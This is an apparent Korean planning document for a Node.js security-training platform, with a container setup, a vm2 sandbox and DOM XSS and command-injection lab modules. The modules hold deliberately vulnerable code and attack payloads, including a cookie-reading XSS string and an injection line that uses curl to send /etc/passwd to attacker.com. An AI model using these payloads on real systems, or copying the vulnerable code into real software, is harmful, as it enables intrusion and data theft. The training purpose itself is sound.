# 🟢 Phase 2: Node.js 보안 테스트 환경 통합

**목표**: 실시간 JavaScript/Node.js 코드 실행 및 보안 테스트 환경 구축  
**우선순위**: HIGH  
**예상 기간**: 3-4주  

## 🎯 **1단계: Node.js 보안 컨테이너 구축**

### Docker 환경 확장
```yaml
# docker-compose.yml에 추가
nodejs_security:
  build: ./nodejs-security
  container_name: security_nodejs
  ports:
    - "3001:3001"  # 보안 테스트 전용 포트
    - "3002:3002"  # WebSocket 포트 (실시간 통신)
  environment:
    - NODE_ENV=security_testing
    - MAX_EXECUTION_TIME=5000
    - MAX_MEMORY_USAGE=128MB
  volumes:
    - ./nodejs-modules:/app/modules
    - ./js-challenges:/app/challenges
  depends_on:
    - postgres
    - mongodb
    - redis
  networks:
    - security_network
```

### Node.js Dockerfile 구성
```dockerfile
# nodejs-security/Dockerfile
FROM node:18-alpine

# 보안을 위한 사용자 생성
RUN addgroup -g 1001 -S nodejs && \
    adduser -S nextjs -u 1001

# 작업 디렉터리 설정
WORKDIR /app

# 보안 패키지 설치
COPY package*.json ./
RUN npm ci --only=production && \
    npm cache clean --force

# 애플리케이션 파일 복사
COPY --chown=nextjs:nodejs . .

# 보안 설정
RUN chmod -R 755 /app
USER nextjs

# 포트 노출
EXPOSE 3001 3002

# 애플리케이션 시작
CMD ["node", "security-server.js"]
```

## 🎯 **2단계: 실시간 코드 실행 시스템**

### 안전한 코드 샌드박스 (VM2 기반)
```javascript
// nodejs-security/security-server.js
const express = require('express');
const { VM } = require('vm2');
const WebSocket = require('ws');

class SecureCodeExecutor {
    constructor() {
        this.vm = new VM({
            timeout: 5000,
            sandbox: {
                console: {
                    log: (msg) => this.logResult('info', msg),
                    error: (msg) => this.logResult('error', msg)
                },
                require: this.secureRequire.bind(this)
            }
        });
    }

    // 안전한 require 함수 (제한된 모듈만 허용)
    secureRequire(module) {
        const allowedModules = ['crypto', 'util', 'path'];
        if (allowedModules.includes(module)) {
            return require(module);
        }
        throw new Error(`Module '${module}' is not allowed in sandbox`);
    }

    // JavaScript 코드 안전 실행
    async executeJavaScript(code, context = {}) {
        try {
            this.vm.sandbox = { ...this.vm.sandbox, ...context };
            const result = this.vm.run(code);
            return {
                success: true,
                result: result,
                logs: this.logs
            };
        } catch (error) {
            return {
                success: false,
                error: error.message,
                logs: this.logs
            };
        }
    }
}
```

### 실시간 WebSocket 통신
```javascript
// 실시간 코드 실행 및 결과 스트리밍
const wss = new WebSocket.Server({ port: 3002 });

wss.on('connection', (ws) => {
    ws.on('message', async (data) => {
        const { type, code, challenge } = JSON.parse(data);
        
        switch (type) {
            case 'javascript':
                const jsResult = await executor.executeJavaScript(code);
                ws.send(JSON.stringify({ type: 'result', data: jsResult }));
                break;
                
            case 'nodejs':
                const nodeResult = await executor.executeNodeJS(code);
                ws.send(JSON.stringify({ type: 'result', data: nodeResult }));
                break;
                
            case 'sql':
                const sqlResult = await executor.executeSQL(code, challenge.database);
                ws.send(JSON.stringify({ type: 'result', data: sqlResult }));
                break;
        }
    });
});
```

## 🎯 **3단계: JavaScript/Node.js 보안 모듈 개발**

### 클라이언트 사이드 취약점 모듈
```javascript
// js-challenges/dom-xss-challenge.js
const domXSSChallenge = {
    title: "DOM-based XSS",
    description: "사용자 입력이 DOM에 직접 반영되는 취약점을 실습합니다.",
    
    // 취약한 코드 예시
    vulnerableCode: `
        function updateGreeting(name) {
            document.getElementById('greeting').innerHTML = 'Hello ' + name + '!';
        }
        
        // URL 파라미터에서 name 추출
        const params = new URLSearchParams(window.location.search);
        const userName = params.get('name');
        if (userName) {
            updateGreeting(userName);
        }
    `,
    
    // 공격 페이로드
    payloads: [
        '<img src=x onerror=alert("XSS")>',
        '<script>alert(document.cookie)</script>',
        '<svg onload=alert("DOM XSS")></svg>'
    ],
    
    // 안전한 코드 예시
    secureCode: `
        function updateGreeting(name) {
            document.getElementById('greeting').textContent = 'Hello ' + name + '!';
        }
    `
};
```

### 서버 사이드Node.js 취약점 모듈
```javascript
// js-challenges/nodejs-command-injection.js
const commandInjectionChallenge = {
    title: "Node.js Command Injection",
    description: "child_process 모듈을 통한 명령어 인젝션 취약점",
    
    vulnerableCode: `
        const { exec } = require('child_process');
        
        function pingServer(host) {
            // 취약한 코드: 사용자 입력을 직접 명령어에 사용
            exec('ping -c 1 ' + host, (error, stdout, stderr) => {
                if (error) {
                    console.error('Error:', error);
                    return;
                }
                console.log('Ping result:', stdout);
            });
        }
    `,
    
    payloads: [
        '127.0.0.1; cat /etc/passwd',
        '127.0.0.1 && whoami',
        '127.0.0.1 | ls -la',
        '127.0.0.1; curl http://attacker.com/steal?data=$(cat /etc/passwd)'
    ],
    
    secureCode: `
        const { spawn } = require('child_process');
        
        function pingServer(host) {
            // 안전한 코드: 인수를 배열로 분리
            const ping = spawn('ping', ['-c', '1', host]);
            
            ping.stdout.on('data', (data) => {
                console.log('Ping result:', data.toString());
            });
        }
    `
};
```

## 🎯 **4단계: 실시간 UI 통합**

### 코드 실행 인터페이스
```php
// PHP 웹 인터페이스에서 Node.js 연동
class RealTimeCodeExecutor {
    private $nodeServerUrl = 'http://nodejs_security:3001';
    
    public function executeCode($code, $type, $context = []) {
        $postData = [
            'code' => $code,
            'type' => $type,
            'context' => $context,
            'timeout' => 5000
        ];
        
        $ch = curl_init($this->nodeServerUrl . '/execute');
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Content-Type: application/json'
        ]);
        
        $response = curl_exec($ch);
        curl_close($ch);
        
        return json_decode($response, true);
    }
}
```

### WebSocket 클라이언트 (JavaScript)
```javascript
// 실시간 코드 실행 UI
class SecurityTestUI {
    constructor() {
        this.ws = new WebSocket('ws://localhost:3002');
        this.setupEventHandlers();
    }
    
    executeCode(code, type) {
        const message = {
            type: type,
            code: code,
            timestamp: Date.now()
        };
        
        this.ws.send(JSON.stringify(message));
    }
    
    setupEventHandlers() {
        this.ws.onmessage = (event) => {
            const data = JSON.parse(event.data);
            this.displayResult(data);
        };
    }
    
    displayResult(result) {
        const resultDiv = document.getElementById('execution-result');
        resultDiv.innerHTML = `
            <div class="result-box ${result.data.success ? 'success' : 'error'}">
                <h4>실행 결과:</h4>
                <pre>${JSON.stringify(result.data, null, 2)}</pre>
            </div>
        `;
    }
}
```

## 🛠️ **구현 일정**

### Week 1: Node.js 환경 구축
- [ ] Node.js 컨테이너 Dockerfile 및 기본 서버 구현
- [ ] VM2 기반 안전한 코드 실행 시스템 구축
- [ ] WebSocket 실시간 통신 구현

### Week 2: 클라이언트 사이드 모듈
- [ ] DOM XSS 실시간 실행 모듈
- [ ] Prototype Pollution 테스트
- [ ] Client-side Template Injection
- [ ] PostMessage API 악용 시나리오

### Week 3: 서버 사이드 모듈
- [ ] Node.js Command Injection
- [ ] Path Traversal 공격
- [ ] Deserialization 취약점
- [ ] npm 패키지 취약점 시뮬레이션

### Week 4: UI 통합 및 테스트
- [ ] PHP-Node.js 연동 API 구현
- [ ] 실시간 코드 에디터 UI 구축
- [ ] 전체 시스템 통합 테스트
- [ ] 성능 최적화 및 보안 점검

## 📊 **예상 성과**

### 새로운 기능
- **실시간 코드 실행**: JavaScript/Node.js 코드 즉시 실행 및 결과 확인
- **안전한 샌드박스**: VM2 기반 격리된 실행 환경
- **WebSocket 통신**: 실시간 양방향 통신으로 즉각적인 피드백

### 추가 보안 모듈 (예상 20개)
- **클라이언트 사이드**: DOM XSS, Prototype Pollution, CSTI, PostMessage 등 (10개)
- **서버 사이드**: Command Injection, Path Traversal, Deserialization 등 (10개)

## 🚀 **혁신적 기능**

이 Phase 2가 완료되면:
- 📱 **실시간 피드백**: 코드 입력 → 즉시 실행 → 결과 확인
- 🛡️ **안전한 실습**: 격리된 환경에서 위험한 코드도 안전하게 테스트
- 🌐 **다중 언어**: PHP + JavaScript + Node.js 통합 환경
- 🎯 **실무 근접**: 실제 개발 환경과 유사한 테스트 시나리오

**결과**: 세계에서 가장 진보된 **실시간 보안 코딩 실습 플랫폼**이 완성됩니다! 🎉